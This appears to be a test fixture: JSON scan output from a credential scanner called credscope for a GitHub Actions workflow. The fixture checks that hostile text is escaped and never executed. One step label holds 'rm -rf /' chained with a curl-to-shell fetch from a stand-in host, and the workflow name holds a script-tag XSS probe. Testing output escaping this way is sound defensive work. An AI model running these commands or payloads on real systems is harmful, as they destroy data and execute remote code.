@@ -1,0 +1,442 @@
+{
+  "schema_version": "2",
+  "tool": {
+    "name": "credscope",
+    "version": "corpustest"
+  },
+  "scan": {
+    "repository": "gha-untrusted-text-not-executed",
+    "started_at": "2026-01-01T00:00:00Z",
+    "completed_at": "2026-01-01T00:00:00Z",
+    "duration_ms": 0,
+    "format": "json",
+    "fail_on": "none",
+    "minimum_score": 0,
+    "threshold_exceeded": false,
+    "configuration": {
+      "include": [
+        ".github/workflows/*.yaml",
+        ".github/workflows/*.yml",
+        "compose.yaml",
+        "compose.yml",
+        "docker-compose.yaml",
+        "docker-compose.yml"
+      ],
+      "exclude": [
+        ".git/**",
+        ".tmp/**",
+        "build/**",
+        "coverage/**",
+        "dist/**",
+        "node_modules/**",
+        "vendor/**"
+      ],
+      "disabled_rules": [],
+      "no_color": false,
+      "quiet": false,
+      "verbose": false
+    },
+    "profile": {
+      "requested": "auto",
+      "selected": "ci",
+      "source": "repository_context",
+      "reason": "The repository contains GitHub Actions workflows and no Docker Compose input.",
+      "assumptions": [
+        "Jobs are treated as ephemeral unless repository evidence says otherwise.",
+        "Secrets available to jobs and steps are reported.",
+        "Untrusted pull-request risk is evaluated separately."
+      ]
+    }
+  },
+  "policies": {
+    "scoring_policy": "v2",
+    "rule_catalog": "v2"
+  },
+  "summary": {
+    "credential_count": 0,
+    "informational": 0,
+    "low": 0,
+    "medium": 0,
+    "high": 0,
+    "critical": 0,
+    "highest_score": 0,
+    "threshold_exceeded": false
+  },
+  "credentials": [],
+  "graph": {
+    "nodes": [
+      {
+        "id": "node:file:40ddfc8ad8a8f66566f91567cf768dd72967ec02ee86eadca358f5cd5cd395b5",
+        "type": "file",
+        "label": ".github/workflows/hostile-text.yml",
+        "location": {
+          "path": ".github/workflows/hostile-text.yml"
+        },
+        "metadata": {
+          "path": ".github/workflows/hostile-text.yml"
+        },
+        "evidence": [
+          {
+            "rule_id": "",
+            "description": "GitHub Actions workflow",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 1,
+              "column": 1
+            },
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      },
+      {
+        "id": "node:job:e8aec65a6c674c2e904f98b1c4acea0c2fc515149a92645bdaca3998d59b23f2",
+        "type": "job",
+        "label": "hostile",
+        "location": {
+          "path": ".github/workflows/hostile-text.yml",
+          "line": 10,
+          "column": 5
+        },
+        "metadata": {
+          "job_id": "hostile",
+          "workflow": "\u003cscript\u003ealert(1)\u003c/script\u003e ] --\u003e ANSI-ESCAPE-LOOKALIKE-red"
+        },
+        "evidence": [
+          {
+            "rule_id": "",
+            "description": "Workflow job",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 10,
+              "column": 5
+            },
+            "field": "jobs.hostile",
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      },
+      {
+        "id": "node:permission:9e40b3a9d80655a28d1116955bacb2612cce5203958e28ebdd9a2c92f73aa4b0",
+        "type": "permission",
+        "label": "contents:read",
+        "location": {
+          "path": ".github/workflows/hostile-text.yml",
+          "line": 6,
+          "column": 13
+        },
+        "metadata": {
+          "level": "read",
+          "scope": "contents"
+        },
+        "evidence": [
+          {
+            "rule_id": "",
+            "description": "Repository permission",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 6,
+              "column": 13
+            },
+            "field": "workflow.permissions.contents",
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      },
+      {
+        "id": "node:repository:d42b474ace914236607799e5489b38ccd30a84d7e222a8c6d07055ebfd5fda08",
+        "type": "repository",
+        "label": "repository",
+        "metadata": {
+          "scope": "selected_root"
+        },
+        "confidence": "confirmed"
+      },
+      {
+        "id": "node:step:672cf9e7f67ed6622e3b878c26ac6fcef8c0fefc51d3845dd2c262c2acaf08b6",
+        "type": "step",
+        "label": "`rm -rf /` ; echo pwned \u0026\u0026 curl http://example.invalid/evil.sh | sh",
+        "location": {
+          "path": ".github/workflows/hostile-text.yml",
+          "line": 12,
+          "column": 9
+        },
+        "metadata": {
+          "has_shell": "true",
+          "step_id": ""
+        },
+        "evidence": [
+          {
+            "rule_id": "",
+            "description": "Workflow step",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 12,
+              "column": 9
+            },
+            "field": "jobs.hostile.steps[0]",
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      },
+      {
+        "id": "node:step:f7c3852e78f956f049be5662b0529ca49c99aab16196392d8fd0e7333f8c68d9",
+        "type": "step",
+        "label": "graph TD; X[mermaid-lookalike] --\u003e Y[should not become a diagram directive]",
+        "location": {
+          "path": ".github/workflows/hostile-text.yml",
+          "line": 14,
+          "column": 9
+        },
+        "metadata": {
+          "has_shell": "true",
+          "step_id": ""
+        },
+        "evidence": [
+          {
+            "rule_id": "",
+            "description": "Workflow step",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 14,
+              "column": 9
+            },
+            "field": "jobs.hostile.steps[1]",
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      },
+      {
+        "id": "node:trigger:3517575a56753e3958b641b1480e152b60fbd4a613d2765bff47a8d8a8d968fb",
+        "type": "trigger",
+        "label": "push",
+        "location": {
+          "path": ".github/workflows/hostile-text.yml",
+          "line": 3,
+          "column": 6
+        },
+        "metadata": {
+          "name": "push"
+        },
+        "evidence": [
+          {
+            "rule_id": "",
+            "description": "Workflow trigger",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 3,
+              "column": 6
+            },
+            "field": "on",
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      },
+      {
+        "id": "node:workflow:5b3351e528fdb174572f12c31444d6231b620c5cd34804ea3b15e5b96c4f214e",
+        "type": "workflow",
+        "label": "\u003cscript\u003ealert(1)\u003c/script\u003e ] --\u003e ANSI-ESCAPE-LOOKALIKE-red",
+        "location": {
+          "path": ".github/workflows/hostile-text.yml",
+          "line": 1,
+          "column": 1
+        },
+        "metadata": {
+          "file": ".github/workflows/hostile-text.yml",
+          "missing_explicit_permissions": "false"
+        },
+        "evidence": [
+          {
+            "rule_id": "",
+            "description": "GitHub Actions workflow",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 1,
+              "column": 1
+            },
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      }
+    ],
+    "edges": [
+      {
+        "id": "edge:091776b3bba9449bd4b44fc72a0035ff020e0849553f590d6814c5acb8674942",
+        "from": "node:file:40ddfc8ad8a8f66566f91567cf768dd72967ec02ee86eadca358f5cd5cd395b5",
+        "to": "node:repository:d42b474ace914236607799e5489b38ccd30a84d7e222a8c6d07055ebfd5fda08",
+        "type": "detected_in",
+        "evidence_kind": "inferred_exposure_context",
+        "evidence": [
+          {
+            "rule_id": "",
+            "type": "repository_file",
+            "description": "Workflow file belongs to the selected repository.",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 1,
+              "column": 1
+            },
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      },
+      {
+        "id": "edge:594186197258697388082fb27c99c2edb11ab9ffa9f3c85d64ac9529fe19ea5d",
+        "from": "node:workflow:5b3351e528fdb174572f12c31444d6231b620c5cd34804ea3b15e5b96c4f214e",
+        "to": "node:file:40ddfc8ad8a8f66566f91567cf768dd72967ec02ee86eadca358f5cd5cd395b5",
+        "type": "detected_in",
+        "evidence_kind": "inferred_exposure_context",
+        "evidence": [
+          {
+            "rule_id": "",
+            "type": "workflow_definition",
+            "description": "Workflow is defined in this file.",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 1,
+              "column": 1
+            },
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      },
+      {
+        "id": "edge:79145b01d6f49e11bfe0053a100a5172b1c6140291280c719e448e9f460d538c",
+        "from": "node:workflow:5b3351e528fdb174572f12c31444d6231b620c5cd34804ea3b15e5b96c4f214e",
+        "to": "node:permission:9e40b3a9d80655a28d1116955bacb2612cce5203958e28ebdd9a2c92f73aa4b0",
+        "type": "has_permission",
+        "evidence_kind": "inferred_exposure_context",
+        "evidence": [
+          {
+            "rule_id": "",
+            "type": "permission",
+            "description": "Explicit GitHub Actions permission.",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 6,
+              "column": 13
+            },
+            "field": "workflow.permissions.contents",
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      },
+      {
+        "id": "edge:8edd8a27339cadae21676eb16b5691e55e1c2a0b080ed92cdd2f3db9dd6f556e",
+        "from": "node:workflow:5b3351e528fdb174572f12c31444d6231b620c5cd34804ea3b15e5b96c4f214e",
+        "to": "node:trigger:3517575a56753e3958b641b1480e152b60fbd4a613d2765bff47a8d8a8d968fb",
+        "type": "triggered_by",
+        "evidence_kind": "inferred_exposure_context",
+        "evidence": [
+          {
+            "rule_id": "",
+            "type": "workflow_trigger",
+            "description": "Workflow declares this trigger.",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 3,
+              "column": 6
+            },
+            "field": "on",
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      },
+      {
+        "id": "edge:9f420fd034e9742605eb11706aaccb0169435ce10267e08eb46db90b0fa3b81c",
+        "from": "node:step:f7c3852e78f956f049be5662b0529ca49c99aab16196392d8fd0e7333f8c68d9",
+        "to": "node:job:e8aec65a6c674c2e904f98b1c4acea0c2fc515149a92645bdaca3998d59b23f2",
+        "type": "belongs_to",
+        "evidence_kind": "inferred_exposure_context",
+        "evidence": [
+          {
+            "rule_id": "",
+            "type": "workflow_step",
+            "description": "Step executes within this job.",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 14,
+              "column": 9
+            },
+            "field": "jobs.hostile.steps[1]",
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      },
+      {
+        "id": "edge:d6371918b330d4530b3545a541678b56b19fff344cc37d5f7dfb17bc67904462",
+        "from": "node:job:e8aec65a6c674c2e904f98b1c4acea0c2fc515149a92645bdaca3998d59b23f2",
+        "to": "node:workflow:5b3351e528fdb174572f12c31444d6231b620c5cd34804ea3b15e5b96c4f214e",
+        "type": "belongs_to",
+        "evidence_kind": "inferred_exposure_context",
+        "evidence": [
+          {
+            "rule_id": "",
+            "type": "workflow_job",
+            "description": "Job belongs to this workflow.",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 10,
+              "column": 5
+            },
+            "field": "jobs.hostile",
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      },
+      {
+        "id": "edge:d6b7d4541e377b816ccf502cb9e38dbda3a60d506c73795e1eee1eef15648ed2",
+        "from": "node:step:672cf9e7f67ed6622e3b878c26ac6fcef8c0fefc51d3845dd2c262c2acaf08b6",
+        "to": "node:job:e8aec65a6c674c2e904f98b1c4acea0c2fc515149a92645bdaca3998d59b23f2",
+        "type": "belongs_to",
+        "evidence_kind": "inferred_exposure_context",
+        "evidence": [
+          {
+            "rule_id": "",
+            "type": "workflow_step",
+            "description": "Step executes within this job.",
+            "location": {
+              "path": ".github/workflows/hostile-text.yml",
+              "line": 12,
+              "column": 9
+            },
+            "field": "jobs.hostile.steps[0]",
+            "source": "github-actions",
+            "confidence": "confirmed"
+          }
+        ],
+        "confidence": "confirmed"
+      }
+    ]
+  },
+  "repository_warnings": [],
+  "parser_warnings": [],
+  "non_fatal_errors": [],
+  "ignored_count": 0,
+  "ignored_items": []
+}
